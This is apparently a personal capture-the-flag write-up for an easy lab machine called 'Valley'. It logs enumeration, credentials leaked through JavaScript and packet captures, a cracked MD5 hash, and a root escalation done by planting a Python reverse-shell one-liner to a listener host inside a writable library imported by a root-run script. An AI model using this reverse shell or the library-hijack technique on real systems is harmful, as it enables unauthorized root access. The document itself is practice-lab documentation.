Valley
  Difficulty: Easy 
Can you find your way into the Valley?

nmap, ssh , hhtp, 80 22
nmap more things later
3 pages total available. intro page, pricing, and gallery, 
there is a link to a js/art.js which doesnt seem to be available, strange. <<<
>>>
galley has images, 
no wierd comments or antyWthing. 
gobuster with Big wordlist
nothing fun comes up. 


run nikto 

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.225.25
+ Target Hostname:    10.10.225.25
+ Target Port:        80
+ Start Time:         2023-11-12 23:46:45 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 48b, size: 5f6578751d51c, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /static/: Directory indexing found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-11-13 00:10:36 (GMT-5) (1431 seconds)



ssh check?
nmap -sV --script=ssl-heartbleed 192.168.3.157
Vulnerability Details : CVE-2023-38408

nmap more ports. really hitting this guy hard. 
37370
ftp open
anon login off. thats it for ports. 

lets download some images, see if anything in there, maybe it talking about a valley in a picture? 
no pass given, not great there. plus no tag on challenge for stego, just enum

gonna fuzz more , dirb/gobuster each subfolder, gallery has nothing else, gallery has an extra 00, thats the ticket. 
gobuster dir -u http://10.10.49.52/static/  -w /usr/share/wordlists/dirb/common.txt


static/00
-------------
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
----------------------
in /dev1243224123123
is login page, try admin admin no dice, error message shows username or pass, check source. 

has js file. hardcoded errors, and credentials. sweeet
if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";

dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port

--------------------------
 now im into FTP right? right? 
 BANG FTP in , all thats in there is some wireshark captures. digging continues. 

 doesnt seem to be much except an anon login to ftp, 
 ssh doesant reuse credentials. 
 in http2 file, one http request has a form submission
 this is ssh creds
valleyDev
ph0t0s1234

user flag right on desktop. 
pull down linpeas and 
run some linpeas. 

user valley is other user, and siem dev. 
siemdev is just the ftp , nothing useful, 

linpeas has lots to say 
tried to use Root shell PoC for CVE-2021-3156 , no dice. 
CVE-2021-3560 is as well, a bust. should have known conisdering the challenge is pretty newe. 
there is an interesting file called valley authenticator
its a binary . put it into ghidra, dont know what i was expecting to find. 
put thorugh strings, find user and see what looks like a hash. 
strings on that gives us e6722920bab2326f8217e4- md5, crackstation has it, 

valley
liberty123


ran linpeas again, photos script is wierd, and we can write to the python base64 library, maybe thall be useful. 

/usr/lib/python3.8/base64.py
added a line to the base64 module. 
since the script runs as root, if we make a reverse shell spawn from it, were root. 
coulnt write to the script itself but the library behind it is good enough for me. 
from https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/

import socket,os,pty;s=socket.socket();s.connect(("10.2.0.82",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")

nc -lvnp 4444

and boom. another one in the bag. 
